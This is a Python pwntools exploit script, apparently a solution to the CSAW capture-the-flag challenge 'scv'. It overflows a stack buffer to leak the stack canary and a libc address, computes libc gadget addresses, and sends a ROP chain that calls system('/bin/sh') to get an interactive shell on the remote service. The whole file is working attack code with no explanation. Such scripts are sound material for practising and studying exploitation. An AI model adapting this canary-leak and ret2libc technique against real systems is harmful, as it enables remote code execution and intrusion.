from pwn import *

context.arch = 'amd64'
s = remote('pwn.chal.csaw.io', 3764)
#e = ELF('./scv')
#s = process(e.path, env={'LD_PRELOAD': './libc-2.23.so'})


#gdb.attach(s, gdbscript="""
#b * main + 568
#b * main + 841
#""")

raw_input('Exploit?')
offset_libcstartmain = 0x20740
offset_system = 0x45390
offset_binsh = 0x18cd17
offset_poprdi_popret = 0x3cb6b2
offset_onegadget = 0x4526a
offset_popcall = 0x1073da
offset_poprax = 0x33544

payload = ''
payload += 'A' * 168

s.recvuntil('>>')
s.sendline('1')
s.recvuntil('>>')
s.sendline(payload)

s.recvuntil('>>')
s.sendline('2')
s.recvuntil('AAAA\n')
leaked_cookie = s.recv(7)
s.recvuntil('>>')

leaked_cookie = u64(leaked_cookie.rjust(8, '\x00'))
print "Leaked cookie:", hex(leaked_cookie)

payload = ''
payload += 'A' * 183

s.sendline('1')
s.recvuntil('>>')
s.sendline(payload)

s.recvuntil('>>')
s.sendline('2')
s.recvuntil('AAAA\n')
leaked_addr = s.recv(6)
s.recvuntil('>>')

leaked_addr = u64(leaked_addr.ljust(8, '\x00'))
print 'Leaked address:', hex(leaked_addr)
libc_base = leaked_addr - 240 - offset_libcstartmain

system_addr = libc_base + offset_system
binsh_addr = libc_base + offset_binsh
poprdi_popret_addr = libc_base + offset_poprdi_popret
onegadget_addr = libc_base + offset_onegadget
poprax_addr = libc_base + offset_poprax
popcall_addr = libc_base + offset_popcall

ropchain = ''
ropchain += p64(poprax_addr)
ropchain += p64(system_addr)
ropchain += p64(popcall_addr)
ropchain += p64(binsh_addr)

payload = ''
payload += 'A' * 168
payload += p64(leaked_cookie)
payload += 'A' * 8
payload += ropchain

s.sendline('1')
s.recvuntil('>>')
s.sendline(payload)
s.recvuntil('>>')
s.sendline('3')
#s.sendline('cat flag')
#print s.recv()
s.interactive()

s.close()

